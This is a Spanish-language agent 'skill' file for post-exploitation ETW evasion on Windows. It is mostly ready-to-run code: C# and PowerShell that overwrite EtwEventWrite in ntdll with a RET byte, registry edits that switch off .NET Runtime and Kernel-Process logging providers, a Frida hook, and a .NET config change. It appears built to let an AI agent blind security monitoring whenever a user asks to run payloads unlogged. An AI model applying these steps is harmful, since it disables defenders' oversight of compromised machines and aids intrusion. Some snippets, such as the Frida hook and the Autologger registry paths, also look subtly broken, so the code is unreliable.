---
name: evasion-etw-bypass
description: Bypass de Event Tracing for Windows (ETW) — parcheo de EtwEventWrite, deshabilitación de proveedores, Frida hooking, .NET ETW evasion.
phase: post
---

# Evasion — ETW Bypass

## Activation Contract

**Trigger**: El usuario pide evadir/silenciar ETW, parchear EtwEventWrite, deshabilitar proveedores de tracing, o ejecutar payload sin ser registrado por ETW.

**Preconditions**:
- Acceso a un host Windows con privilegios de administrador.
- Capacidad de escribir en memoria de proceso (kernel32 / ntdll).
- Identificar qué proveedores ETW están activos.

**Postconditions**:
- ETW silenciado para el proceso actual o específico.
- Salida JSON con técnica aplicada, proveedores detectados y estado.

---

## Hard Rules

1. **Parchear solo el proceso actual** a menos que se acuerde un bypass global.
2. **No persistir parches ETW** en disco (registry o driver) sin autorización.
3. **Verificar que el bypass funciona** antes de ejecutar payload adicional.
4. **Documentar qué proveedores se deshabilitaron** para trazabilidad.

---

## Decision Gates

| Pregunta | Opciones |
|----------|----------|
| Alcance del bypass | `Current process`, `Specific PID`, `Global (registry)`, `Domain-wide (GPO)` |
| Técnica de bypass | `EtwEventWrite patch (0xC3)`, `Registry providers`, `Frida hook`, `.NET config` |
| Proveedor ETW a silenciar | `Microsoft-Windows-Kernel-Process`, `Microsoft-Windows-DotNETRuntime`, `ALL` |
| Confirmar parcheo de memoria | `Yes - parchear`, `No - solo enumerar` |

---

## Execution Steps

### 1. Detectar proveedores ETW activos

```powershell
# Listar todos los proveedores ETW registrados
logman query providers

# Filtrar proveedores relevantes para seguridad
logman query providers | Select-String -Pattern ("Microsoft-Windows-Kernel-Process|Microsoft-Windows-DotNETRuntime|Microsoft-Antimalware")
```

### 2. EtwEventWrite Patching (método principal)

```csharp
// C# P/Invoke: parchear EtwEventWrite en ntdll.dll con ret 0xC3
// 1. Obtener dirección de EtwEventWrite via GetProcAddress(ntdll, "EtwEventWrite")
// 2. VirtualProtect(PAGE_READWRITE)
// 3. Escribir 0xC3 (RET) en los primeros bytes
// 4. VirtualProtect restaurar protección original

[DllImport("kernel32.dll")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")]
static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32.dll")]
static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

var etwAddr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
VirtualProtect(etwAddr, 1, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE
Marshal.WriteByte(etwAddr, 0xC3); // RET
VirtualProtect(etwAddr, 1, oldProtect, out _);
```

### 3. Parchear EtwEventWrite via PowerShell

```powershell
# Usar Add-Type con C# embebido para el parche
$patch = @'
using System;
using System.Runtime.InteropServices;
public class ETWBypass {
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    public static void Patch() {
        var addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
        VirtualProtect(addr, 1, 0x40, out var old);
        Marshal.WriteByte(addr, 0xC3);
        VirtualProtect(addr, 1, old, out _);
        Console.WriteLine("[+] ETW patched at 0x" + addr.ToString("X"));
    }
}
'@
Add-Type $patch
[ETWBypass]::Patch()
```

### 4. Deshabilitar proveedores vía Registry

```powershell
# Deshabilitar proveedores ETW específicos (requiere admin)
$providers = @(
    "{E13B77A8-14B6-11DE-8069-00123DC06FF0}", # .NET Runtime
    "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"  # Kernel Process
)
foreach ($guid in $providers) {
    $path = "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\$guid"
    if (Test-Path $path) {
        Set-ItemProperty -Path $path -Name "Start" -Value 0
        Write-Output "[+] Disabled provider: $guid"
    }
}

# Alternativa: deshabilitar todo ETW (extremo)
# Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger" -Name "Start" -Value 0
```

### 5. Frida Hook para ETW

```bash
# Frida script para interceptar EtwEventWrite y no-op
frida -p $PID -l etw-bypass.js

// etw-bypass.js
Interceptor.attach(Module.findExportByName("ntdll.dll", "EtwEventWrite"), {
    onEnter: function(args) {
        console.log("[+] Blocked ETW event");
        this.retval = 0; // simular éxito
    }
});
```

### 6. .NET ETW Bypass (config)

```xml
<!-- App.config para deshabilitar ETW en .NET Framework -->
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <runtime>
    <etwEnable enabled="false"/>
  </runtime>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2"/>
  </startup>
</configuration>
```

```csharp
// Alternativa programática en .NET
// AppContext.SetSwitch("System.Diagnostics.Tracing.EventSource.IsEnabled", false);
// O via reflection deshabilitar EventListener interno
```

---

## Output Contract

```json
{
  "phase": "post",
  "skill": "evasion-etw-bypass",
  "target": {
    "host": "WIN-XXXX",
    "process": "powershell.exe",
    "pid": 4567
  },
  "technique": "EtwEventWrite_0xC3_Patch",
  "detected_providers": [
    "Microsoft-Windows-Kernel-Process",
    "Microsoft-Windows-DotNETRuntime",
    "Microsoft-Antimalware-Engine"
  ],
  "bypass_result": {
    "success": true,
    "patched_address": "0x7ffa12345678",
    "original_bytes": "0x48895C24",
    "patched_bytes": "0xC3"
  },
  "verification": "ETW event count before/after: 12 -> 0",
  "cleanup": "Restaurar bytes originales en EtwEventWrite"
}
```

## Referencias

- MITRE ATT&CK T1562.006 (Indicator Blocking: ETW)
- NtProtectVirtualMemory / VirtualProtect
- `EtwEventWrite` en ntdll.dll
- Frida Interceptor API
